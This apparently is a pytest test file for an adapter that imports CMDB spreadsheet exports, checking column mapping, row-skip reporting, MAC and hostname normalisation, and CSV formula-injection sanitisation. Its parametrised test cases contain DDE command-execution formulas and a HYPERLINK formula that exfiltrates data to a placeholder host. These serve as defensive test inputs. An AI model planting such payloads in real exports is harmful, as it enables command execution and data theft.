"""Reading a CMDB export: the column mapping, the sanitisation, and the refusals.

The security-specific file of P10. A CMDB export is a file a person edited in a spreadsheet,
and a spreadsheet cell is a program — so the formula-injection tests here are the ones that
matter most, in the same way the profile→flags tests carry P5 and the credential-leak tests
carry P7.

Fixtures only; CI never needs a real CMDB (AGENTS.md §43).
"""

from __future__ import annotations

from datetime import UTC, datetime
from pathlib import Path
from uuid import UUID

import pytest

from adapters.managed.cmdb_csv import (
    FORMULA_GUARD,
    FORMULA_LEAD_CHARACTERS,
    MAX_CELL_LENGTH,
    ColumnMapping,
    CsvCmdbSource,
    defang,
    normalize_hostname,
    normalize_mac,
    sanitize_cell,
)
from domain.errors import ValidationError
from domain.models import (
    ManagedRecordInput,
    ManagedSourceKind,
    SkipReason,
    SourceReadReport,
)
from domain.ports import ManagedSource

FIXTURES = Path(__file__).resolve().parent / "fixtures" / "cmdb"

TENANT = UUID("11111111-1111-1111-1111-111111111111")
EXPORTED_AT = datetime(2026, 8, 14, 9, 0, tzinfo=UTC)

#: The operator's real export names nothing the way our model does. That is the point.
MAPPING = ColumnMapping(
    external_id="Asset ID",
    hostname="Device Name",
    serial="S/N",
    mac="MAC Address",
    ip="IP",
    owner="Owner",
    extras={"site": "Site"},
)


def source(name: str, mapping: ColumnMapping = MAPPING) -> CsvCmdbSource:
    return CsvCmdbSource(FIXTURES / name, mapping, observed_at=EXPORTED_AT)


def read(
    name: str, mapping: ColumnMapping = MAPPING
) -> tuple[list[ManagedRecordInput], SourceReadReport]:
    reader = source(name, mapping)
    records = list(reader.records(TENANT))
    return records, reader.read_report()


# ------------------------------------------------------------- the column mapping


def test_columns_named_anything_map_to_identity_fields() -> None:
    """`S/N`, `Device Name`, `MAC Address` — the difference between "works on the fixture"
    and "works on your actual Excel" (m2-design §2)."""
    records, _ = read("clean.csv")

    first = records[0]
    assert first.external_id == "CMDB-0001"
    assert first.hostname == "app-01.corp.internal"
    assert first.serial == "SN-ABC-1234"
    assert first.mac == "aa:bb:cc:dd:ee:ff"
    assert first.ip == "10.10.5.7"
    assert first.owner == "alice@corp.internal"
    assert first.attributes == {"site": "HQ"}


def test_a_spanish_export_maps_just_as_well() -> None:
    """A mapping is configuration, so a differently-named export needs no code change."""
    spanish = FIXTURES / "spanish.csv"
    spanish.write_text(
        "Identificador,Nombre,Numero de serie\nCMDB-9001,servidor-01,SN-ES-1\n",
        encoding="utf-8",
    )
    try:
        reader = CsvCmdbSource(
            spanish,
            ColumnMapping(external_id="Identificador", hostname="Nombre", serial="Numero de serie"),
            observed_at=EXPORTED_AT,
        )
        records = list(reader.records(TENANT))
    finally:
        spanish.unlink()

    assert [(r.external_id, r.hostname, r.serial) for r in records] == [
        ("CMDB-9001", "servidor-01", "SN-ES-1")
    ]


def test_a_mapped_column_missing_from_the_file_is_a_loud_error() -> None:
    """Reading it as empty would produce an import that succeeds while losing exactly the
    field the operator cared about."""
    mapping = ColumnMapping(external_id="Asset ID", serial="Serial Number")  # not in the file

    with pytest.raises(ValidationError, match="missing mapped columns"):
        list(source("clean.csv", mapping).records(TENANT))


def test_a_mapping_without_an_external_id_is_refused() -> None:
    with pytest.raises(ValidationError, match="external_id"):
        ColumnMapping(external_id="  ", serial="S/N")


def test_a_mapping_with_no_identity_column_is_refused() -> None:
    """Records with no serial, MAC, hostname or IP can never be matched to an asset — an
    import that looks successful and is useless."""
    with pytest.raises(ValidationError, match="at least one identity column"):
        ColumnMapping(external_id="Asset ID", owner="Owner")


# ------------------------------------------------------- CSV formula injection


@pytest.mark.parametrize(
    "hostile",
    [
        "=cmd|'/c calc'!A1",
        '=HYPERLINK("http://evil.example/"&A1,"click me")',
        "+1+cmd|'/c calc'!A1",
        "-2+3+cmd|'/c calc'!A1",
        "@SUM(1+9)*cmd|'/c calc'!A1",
        "\t=1+1",
        "\r=1+1",
        "=1+1",
    ],
)
def test_a_formula_shaped_cell_is_neutralised(hostile: str) -> None:
    """The security-critical assertion of P10.

    We never open these files in a spreadsheet — but we export our data, and a value carried
    through unchanged would be a live formula in whatever report an operator opens next.
    The apostrophe is the marker every spreadsheet already understands as "this is text".
    """
    cleaned, was_defanged = sanitize_cell(hostile)

    assert was_defanged is True
    assert cleaned.startswith(FORMULA_GUARD)
    assert not cleaned.startswith(FORMULA_LEAD_CHARACTERS)
    # The content survives — this is inventory data, not something to silently rewrite.
    assert hostile.strip() in cleaned


def test_an_ordinary_value_is_left_alone() -> None:
    """Defanging must not become mangling: the vast majority of cells are untouched."""
    for ordinary in ("APP-01", "SN-ABC-1234", "alice@corp.internal", "10.10.5.7", "HQ"):
        cleaned, was_defanged = sanitize_cell(ordinary)
        assert (cleaned, was_defanged) == (ordinary, False)


def test_hostile_cells_in_a_real_export_never_reach_a_record_raw() -> None:
    """End to end over the messy fixture: not one field of not one record starts with a
    formula character."""
    records, report = read("messy.csv")

    assert report.defanged_cells > 0  # the fixture really does contain them
    for record in records:
        for value in (record.hostname, record.serial, record.mac, record.ip, record.owner):
            if value is not None:
                assert not value.startswith(FORMULA_LEAD_CHARACTERS)
        for value in record.attributes.values():
            assert not value.startswith(FORMULA_LEAD_CHARACTERS)


def test_a_formula_in_an_identity_column_is_dropped_not_stored() -> None:
    """Stricter than defanging, and better: a defanged value fails every identifier pattern,
    so a formula-shaped hostname or serial becomes `None` rather than a poisoned anchor the
    P11 diff would match on."""
    records, _ = read("messy.csv")

    evil = next(record for record in records if record.external_id == "CMDB-0003")
    assert evil.hostname is None  # was "=cmd|'/c calc'!A1"
    assert evil.serial == "SN-EVIL-1"  # the legitimate field on that row survives
    # …while the free-text owner keeps its (defanged) content, since it is not an anchor.
    assert evil.owner is not None
    assert evil.owner.startswith(FORMULA_GUARD)


def test_a_workbook_full_of_live_formulas_is_defanged_too() -> None:
    """An .xlsx saved without cached values hands back the formula text itself, so the
    sanitiser runs over Excel cells exactly as it does over CSV."""
    records, report = read("formula.xlsx")

    assert report.defanged_cells >= 2
    for record in records:
        assert record.hostname is None  # the formula-shaped name is refused as an anchor
        assert record.owner is None or record.owner.startswith(FORMULA_GUARD)


def test_control_characters_are_stripped() -> None:
    """A newline in a cell is how a value smuggles a row separator into a later export."""
    cleaned, _ = sanitize_cell("APP\x0001\r\nDROP")

    assert "\x00" not in cleaned
    assert "\n" not in cleaned


def test_defang_is_directly_testable() -> None:
    assert defang("=1+1") == ("'=1+1", True)
    assert defang("ok") == ("ok", False)


# --------------------------------------------------------------- messy input


def test_every_bad_row_is_skipped_with_a_reason_and_counted() -> None:
    """Never crash, never silently drop. A quiet loss here is the most dangerous failure
    this adapter has: a managed device missing from the store reads as shadow IT in P11."""
    records, report = read("messy.csv")

    reasons = report.reasons
    assert reasons[SkipReason.BLANK.value] == 1
    assert reasons[SkipReason.NO_IDENTITY.value] == 2
    assert reasons[SkipReason.DUPLICATE_EXTERNAL_ID.value] == 1
    assert reasons[SkipReason.NO_EXTERNAL_ID.value] == 1
    assert report.balanced  # rows read == records yielded + skipped
    assert {record.external_id for record in records} == {
        "CMDB-0001",
        "CMDB-0003",
        "CMDB-0004",
    }


def test_a_row_that_is_formulas_all_the_way_down_becomes_unusable_not_stored() -> None:
    """CMDB-0005 in the messy fixture has a formula in every identity column. Each one is
    defanged, each defanged value then fails its identifier pattern, and the row is refused
    as unmatchable — counted, never stored as a record with poisoned anchors."""
    records, report = read("messy.csv")

    assert "CMDB-0005" not in {record.external_id for record in records}
    assert report.reasons[SkipReason.NO_IDENTITY.value] == 2  # CMDB-0002 and CMDB-0005


def test_a_skip_records_where_it_happened_but_not_what_was_in_it() -> None:
    """A diagnostic is not the place for untrusted text (AGENTS.md §2.9)."""
    _, report = read("messy.csv")

    for skipped in report.skipped:
        assert skipped.row_number >= 2  # row 1 is the header
        assert "cmd|" not in str(skipped.model_dump())


def test_an_oversized_cell_skips_its_row_without_taking_the_file_with_it() -> None:
    records, report = read("oversized.csv")

    assert report.reasons == {SkipReason.OVERSIZED.value: 1}
    assert [record.external_id for record in records] == ["CMDB-0101"]
    assert report.skipped[0].column == "S/N"


def test_an_invalid_mac_or_ip_becomes_none_rather_than_a_bad_anchor() -> None:
    records, _ = read("messy.csv")

    row = next(record for record in records if record.external_id == "CMDB-0004")
    assert row.hostname == "good-host"
    assert row.mac is None  # "not-a-mac"
    assert row.ip is None  # "999.999.999.999" — octets out of range


def test_a_row_with_only_an_owner_is_unmatchable_and_refused() -> None:
    """An authoritative record with no identifiable device is a row the diff can never use,
    and storing it would inflate the "managed" count with nothing behind it."""
    records, report = read("messy.csv")

    assert "CMDB-0002" not in {record.external_id for record in records}
    assert any(skip.reason is SkipReason.NO_IDENTITY for skip in report.skipped)


def test_the_first_of_two_rows_with_the_same_id_wins_and_the_second_is_counted() -> None:
    """The file disagrees with itself; picking one silently would be a guess about which is
    current, so the second is refused with a reason an operator can act on."""
    records, report = read("messy.csv")

    duplicate = [record for record in records if record.external_id == "CMDB-0001"]
    assert len(duplicate) == 1
    assert duplicate[0].owner == "alice@corp.internal"  # the first row, not "bob"
    assert any(skip.reason is SkipReason.DUPLICATE_EXTERNAL_ID for skip in report.skipped)


# ------------------------------------------------------------------ csv vs xlsx


def test_csv_and_xlsx_normalize_to_the_same_records() -> None:
    """The operator's export may be either; the records must not differ because of it."""
    from_csv, _ = read("clean.csv")
    from_xlsx, _ = read("clean.xlsx")

    def comparable(records: list[ManagedRecordInput]) -> list[tuple[str | None, ...]]:
        return [(r.external_id, r.hostname, r.serial, r.mac, r.ip, r.owner) for r in records]

    assert comparable(from_csv) == comparable(from_xlsx)
    assert len(from_csv) == 3


def test_an_unsupported_format_is_refused() -> None:
    junk = FIXTURES / "export.txt"
    junk.write_text("not a spreadsheet", encoding="utf-8")
    try:
        with pytest.raises(ValidationError, match="unsupported CMDB export format"):
            list(source("export.txt").records(TENANT))
    finally:
        junk.unlink()


def test_a_missing_file_is_refused_clearly() -> None:
    with pytest.raises(ValidationError, match="not found"):
        list(source("does-not-exist.csv").records(TENANT))


# --------------------------------------------------------------- normalization


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("AA:BB:CC:DD:EE:FF", "aa:bb:cc:dd:ee:ff"),
        ("00-40-8C-9D-1E-2F", "00:40:8c:9d:1e:2f"),
        ("aabbcc001122", "aa:bb:cc:00:11:22"),
        ("a:b:c:1:2:3", "0a:0b:0c:01:02:03"),
        ("not-a-mac", None),
        ("", None),
    ],
)
def test_macs_are_normalized_to_the_form_the_scanners_produce(
    raw: str, expected: str | None
) -> None:
    """The anchors only compare equal in P11 if both sides write them the same way."""
    assert normalize_mac(raw) == expected


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("APP-01.CORP.INTERNAL", "app-01.corp.internal"),
        ("app-01.corp.internal.", "app-01.corp.internal"),  # trailing FQDN dot
        ("Printer 3F", None),  # a space is not a hostname
        ("=cmd|calc", None),
    ],
)
def test_hostnames_are_lower_cased_and_validated(raw: str, expected: str | None) -> None:
    assert normalize_hostname(raw) == expected


def test_records_carry_full_provenance() -> None:
    """A record whose truth is entirely "someone said so" has to say who, and as of when."""
    records, _ = read("clean.csv")

    for record in records:
        assert record.source is ManagedSourceKind.CMDB
        assert record.source_ref == "clean.csv"
        assert record.observed_at == EXPORTED_AT  # when the export was taken, not read
        assert record.tenant_id == TENANT
        assert record.has_identity


def test_a_naive_observed_at_is_refused() -> None:
    with pytest.raises(ValidationError, match="timezone-aware"):
        CsvCmdbSource(
            FIXTURES / "clean.csv",
            MAPPING,
            observed_at=datetime(2026, 8, 14, 9, 0),  # noqa: DTZ001
        )


def test_a_cell_at_the_length_limit_is_the_boundary() -> None:
    long_but_fine, _ = sanitize_cell("A" * (MAX_CELL_LENGTH - 1))
    assert len(long_but_fine) == MAX_CELL_LENGTH - 1


# ------------------------------------------------------------------ conformance


def test_the_adapter_satisfies_the_port() -> None:
    managed: ManagedSource = source("clean.csv")

    assert callable(managed.records)
    assert callable(managed.read_report)
